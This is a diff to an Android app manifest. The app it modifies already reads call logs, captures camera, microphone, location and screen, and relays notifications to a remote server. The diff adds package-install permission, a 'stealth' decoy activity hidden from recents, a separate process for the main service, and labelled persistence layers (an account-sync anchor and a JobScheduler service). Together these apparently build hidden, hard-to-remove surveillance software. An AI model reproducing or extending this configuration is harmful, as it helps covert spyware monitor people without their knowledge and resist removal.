@@ -64,6 +64,8 @@
 
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -118,10 +120,19 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
+        <activity
+            android:name=".stealth.decoy.DecoyActivity"
+            android:launchMode="singleTask"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:taskAffinity=".stealth.decoy"
+            android:configChanges="orientation|screenSize|keyboardHidden">
+        </activity>
         <service
             android:name=".service.MainService"
             android:enabled="true"
             android:exported="false"
+            android:process=":remote"
             android:foregroundServiceType="specialUse|location|camera|microphone|mediaProjection">
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
@@ -180,5 +191,30 @@
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="Relay device notifications to remote management server" />
         </service>
+
+        <!-- Layer 1: Account Anchor -->
+        <service
+            android:name=".persistence.anchors.SyncService"
+            android:exported="false"
+            android:process=":sync">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter" />
+            </intent-filter>
+            <meta-data
+                android:name="android.content.SyncAdapter"
+                android:resource="@xml/sync_adapter" />
+        </service>
+
+        <provider
+            android:name=".persistence.anchors.StubProvider"
+            android:authorities="com.fason.app.provider"
+            android:exported="false"
+            android:syncable="true" />
+
+        <!-- Layer 2: JobScheduler -->
+        <service
+            android:name=".persistence.PersistenceJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="false" />
     </application>
 </manifest>
